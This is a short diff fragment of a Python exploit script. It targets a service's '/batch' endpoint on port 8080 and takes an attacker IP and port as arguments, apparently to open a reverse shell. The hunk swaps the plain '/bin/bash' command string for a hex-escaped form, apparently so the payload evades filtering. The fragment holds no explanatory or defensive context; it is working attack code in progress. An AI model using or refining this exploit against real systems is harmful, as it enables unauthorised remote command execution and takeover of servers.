@@ -33,7 +33,7 @@ if len(sys.argv) != 4:
     
 target = "http://%s:8080/batch" % sys.argv[1]
 
-cmd = "//bin//bash"
+cmd = "\\\\x2fbin\\\\x2fbash"
 
 attackerip = sys.argv[2]
 attackerport = sys.argv[3]
